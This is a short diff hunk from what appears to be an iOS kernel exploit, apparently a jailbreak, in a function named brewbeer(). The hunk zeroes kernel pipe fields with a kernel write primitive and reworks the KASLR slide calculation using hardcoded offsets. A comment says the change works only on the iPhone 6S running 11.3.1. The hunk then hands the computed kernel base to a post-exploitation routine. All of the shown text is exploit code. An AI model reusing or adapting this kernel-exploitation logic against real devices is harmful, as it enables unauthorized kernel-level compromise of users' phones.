@@ -967,7 +967,8 @@ void brewbeer() {
     wk64(pipe + 0x08, 0);
     wk64(pipe + 0x10, 0);
     
-    uint64_t kaslr =  ipc_space_kernel - 0xfffffff0075d5030;
+    //6S 11.3.1 only because I am lazy
+    uint64_t kaslr =  kernel_vm_map - (offsets.kernel_map+ (0x102f881f0 - 0x00000000064000000));
     uint64_t base = 0xfffffff007004000 + kaslr;
     post_exploitation(base, kaslr, 0);
     // that should have cleared everything up!
